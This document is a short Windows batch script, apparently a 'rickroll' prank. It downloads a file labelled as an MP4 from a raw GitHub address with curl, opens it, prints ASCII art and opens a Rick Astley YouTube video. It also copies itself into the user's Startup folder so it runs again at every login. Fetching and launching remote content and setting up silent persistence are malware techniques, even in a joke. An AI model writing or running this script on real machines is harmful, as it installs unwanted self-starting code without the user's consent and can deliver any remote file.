curl https://raw.githubusercontent.com/VinhPham47/b/main/a1.mp4 --output djfhfjfirnffir.mp4
start "" "C:\Users\%username%\Downloads\djfhfjfirnffir.mp4" "%video_to_start%"

TIMEOUT 4
@echo off
for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A

:::
:::       _       _                _ _ 
:::      (_)     | |              | | |
:::  ____ _  ____| |  _  ____ ___ | | |
::: / ___) |/ ___) | / )/ ___) _ \| | |
:::| |   | ( (___| |< (| |  | |_| | | |
:::|_|   |_|\____)_| \_)_|   \___/|_|_|
:::


if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
pause

) else (
copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
)
cls